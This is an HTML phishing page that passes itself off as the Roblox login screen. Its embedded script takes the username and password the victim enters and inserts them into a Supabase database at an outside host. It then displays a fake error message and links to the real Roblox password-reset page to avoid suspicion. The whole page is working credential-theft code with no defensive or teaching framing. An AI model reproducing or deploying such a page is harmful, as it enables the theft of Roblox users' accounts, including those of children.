<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Roblox</title>
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap">
  <link rel="stylesheet" href="rstyle.css">
</head>

<body>
  <div class="s">
    <h1>Login to Roblox</h1><br>
    <input type="text" placeholder="Username / Email / Phone" class="login" id="user" name="username" required>
    <br><br>
    <input type="password" placeholder="Password" class="login" id="pass" name="password" required>
    <br><br><br>
    <button id="send" type="button">Log in</button>
    <label id="infolabel" style="color: white; display: none;">Something went wrong. Please try again later.</label>
    <br><br><hr><br>
<a id="f" href="https://www.roblox.com/login/forgot-password-or-username">Forgot password?</a>
  </div>
  
  <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
  <script>
    const SUPABASE_URL = "https://mcaeueqqfhfbvuuilmtl.supabase.co";
    const SUPABASE_KEY = "sb_publishable_1thr_HyKVuLuzwNbgimN4w_LwalkFmu";
    const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

    document.getElementById('send').addEventListener('click', async () => {
      const username = document.getElementById('user').value;
      const password = document.getElementById('pass').value;

      try {
        const { error } = await supabase.from('info').insert([
          { username: username, pass: password }
        ]);

        if (error) {
          console.error('Insert error:', error);
        } else {
          document.getElementById('infolabel').style.display = "flex"
          setTimeout(function(){
            document.getElementById('infolabel').style.display = "none"
          },1500)
        }
      } catch (err) {
        console.error('Network error:', err);
      }
    });
  </script>
</body>
</html>
